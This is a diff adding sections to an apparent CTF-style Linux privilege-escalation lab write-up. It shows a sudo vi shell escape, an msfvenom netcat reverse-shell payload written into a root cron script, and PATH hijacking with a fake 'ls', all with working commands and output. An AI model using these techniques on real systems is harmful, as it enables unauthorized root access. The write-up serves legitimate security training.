@@ -253,3 +253,262 @@ root@polobox:/home/user3#
 Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!
 
 
+============
+
+
+First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"
+
+```
+
+user7@polobox:/home/user3$ su user8
+Password: 
+Welcome to Linux Lite 4.4 user8
+ 
+Wednesday 10 August 2022, 10:27:14
+Memory Usage: 335/1991MB (16.83%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+user8@polobox:/home/user3$ 
+
+```
+
+
+Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?
+Ans. NOPASSWD
+
+```
+
+user8@polobox:/home/user3$ sudo -l
+Matching Defaults entries for user8 on polobox:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user8 may run the following commands on polobox:
+    (root) NOPASSWD: /usr/bin/vi
+user8@polobox:/home/user3$ `
+
+
+```
+
+
+So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.
+
+Now, type ":!sh" to open a shell!
+
+```
+sudo vi
+
+exit using :!sh
+
+user8@polobox:/home/user3$ sudo vi
+
+# 
+# whoami
+root
+# pwd
+/home/user3
+# uname
+Linux
+#
+
+```
+===================
+
+First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"
+
+```
+user8@polobox:/home/user3$ su user4
+Password: 
+Welcome to Linux Lite 4.4 user4
+ 
+Wednesday 10 August 2022, 10:45:10
+Memory Usage: 338/1991MB (16.98%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+user4@polobox:/home/user3$ 
+```
+
+Now, on our host machine- let's create a payload for our cron exploit using msfvenom
+
+
+What is the flag to specify a payload in msfvenom?
+Ans. -p
+
+```
+┌──(kali㉿kali)-[~/ken/brainstack/privesec]
+└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.2.77.171 lport=8888 R
+
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 89 bytes
+mkfifo /tmp/nxei; nc 10.2.77.171 8888 0</tmp/nxei | /bin/sh >/tmp/nxei 2>&1; rm /tmp/nxei
+
+```
+
+
+What directory is the "autoscript.sh" under?
+Ans. /home/user4/Desktop
+
+```
+
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/5  *    * * * root    /home/user4/Desktop/autoscript.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+```
+
+note:
+
+mkfifo /tmp/nxei; nc 10.2.77.171 8888 0</tmp/nxei | /bin/sh >/tmp/nxei 2>&1; rm /tmp/nxei
+
+Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"
+
+```
+user4@polobox:/home/user3$ echo "mkfifo /tmp/nxei; nc 10.2.77.171 8888 0</tmp/nxei | /bin/sh >/tmp/nxei 2>&1; rm /tmp/nxei" > /home/user4/Desktop/autoscript.sh
+user4@polobox:/home/user3$ 
+
+```
+
+
+After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvnp 8888" and wait for our shell to land!
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 8888       
+listening on [any] 8888 ...
+connect to [10.2.77.171] from (UNKNOWN) [10.10.154.204] 59220
+whoami
+root
+pwd
+/root
+uname
+Linux
+```
+
+
+After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!
+
+
+At this moment, i terminated the machine
+
+spawned new machine to continue:
+
+IP: 10.10.66.187
+
+
+Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"
+
+ssh user5@10.10.66.187
+
+```
+Welcome to Linux Lite 4.4 user5
+ 
+Thursday 11 August 2022, 02:58:40
+Memory Usage: 341/1991MB (17.13%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+user5@polobox:~$ 
+
+```
+
+Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?
+Ans. ls
+
+```
+
+user5@polobox:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
+user5@polobox:~$ chmod +x script
+chmod: changing permissions of 'script': Operation not permitted
+user5@polobox:~$ ./script
+Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos
+user5@polobox:~$ 
+
+
+```
+
+Now we know what command to imitate, let's change directory to "tmp". 
+
+
+Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:
+
+echo "[whatever command we want to run]" > [name of the executable we're imitating]
+
+What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating
+
+Ans. echo "/bin/bash/" > ls
+
+
+Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
+Ans. chmod +x ls
+
+```
+user5@polobox:/tmp$ echo "/bin/bash/" > ls
+user5@polobox:/tmp$ chmod +x ls
+user5@polobox:/tmp$ 
+
+```
+
+
+Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH"
+
+Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is.
+
+Once you've finished the exploit, you can exit out of root and use "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH" to reset the PATH variable back to default, letting you use "ls" again!
+
+Now, change directory back to user5's home directory.
+
+
+Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!
+
+```
+
+user5@polobox:/tmp$ ls
+Welcome to Linux Lite 4.4 user5
+ 
+Thursday 11 August 2022, 03:05:36
+Memory Usage: 332/1991MB (16.68%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+user5@polobox:/tmp$ 
+
+
+```
+
+```
+user5@polobox:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+user5@polobox:/tmp$ LS
+
+Command 'LS' not found, but can be installed with:
+
+apt install sl
+Please ask your administrator.
+
+user5@polobox:/tmp$ ls
+ls
+systemd-private-7add8ff3796b40bfb373064ab8945697-apache2.service-iQGQ4L
+systemd-private-7add8ff3796b40bfb373064ab8945697-systemd-resolved.service-IDVr8w
+systemd-private-7add8ff3796b40bfb373064ab8945697-systemd-timesyncd.service-K3kf5f
+vboxguest-Module.symvers
+user5@polobox:/tmp$ 
+
+
+```
